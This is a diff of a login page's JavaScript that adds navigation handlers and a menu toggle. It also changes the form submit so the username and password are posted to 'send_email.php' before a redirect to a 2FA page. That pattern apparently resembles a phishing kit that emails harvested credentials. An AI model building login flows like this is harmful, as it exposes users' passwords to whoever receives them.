@@ -1,47 +1,47 @@
-const form = document.getElementById('login-form');
+document.getElementById('ResetPassword').addEventListener('click', function(event) {
+    window.location.href = "resetPassword.html";
 
-document.getElementById('loginButton').addEventListener('click', function(event) {
+});
+
+document.getElementById('CreateA').addEventListener('click', function(event) {
+    window.location.href = 'SignUpPage.html'; 
+});
+
+document.getElementById('loginBb').addEventListener('click', function(event) {
+    window.location.href = 'security.html'; 
+});
+
+document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    if (username.trim() !== '' && password.trim() !== '') {
-
-        window.location.href = "2Factor.html"; 
-    } else {
-        alert('Please enter both username and password.'); 
-        event.preventDefault();
-    }
-});
-document.getElementById('CreateAccount').addEventListener('click', function(event) {
-    window.location.href = "create_account.html"; 
-
-});
-document.getElementById('loginButton').addEventListener('click', function(event) {
-    event.preventDefault(); // Always prevent default form submission
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    if (username.trim() !== '' && password.trim() !== '') {
+    if (username.trim() && password.trim()) {
         fetch('send_email.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password }) 
+            body: JSON.stringify({ username, password })
         })
         .then(response => response.json())
         .then(data => {
             alert(data.message); 
-            // Redirect after the alert from PHP is shown
-            window.location.href = "2Factor.html";  
-        }) 
-        .catch(error => console.error(error));
+            window.location.href = "2Factor.html"; 
+        })
+        .catch(error => {
+            alert('Login failed: ' + error.message);
+        });
     } else {
-        alert('Please enter both username and password.'); 
+        alert('Please enter both username and password.');
     }
 });
 
-form.addEventListener('submit', function(event) {
-    event.preventDefault(); 
+function toggleMenu() {
+    var menuContainer = document.getElementById('menuContainer');
+    if (menuContainer.style.right == '0px') {
+        menuContainer.style.right = '-250px'; // Hide the menu
+    } else {
+        menuContainer.style.right = '0px'; // Show the menu
+    }
+}
 
-});
 
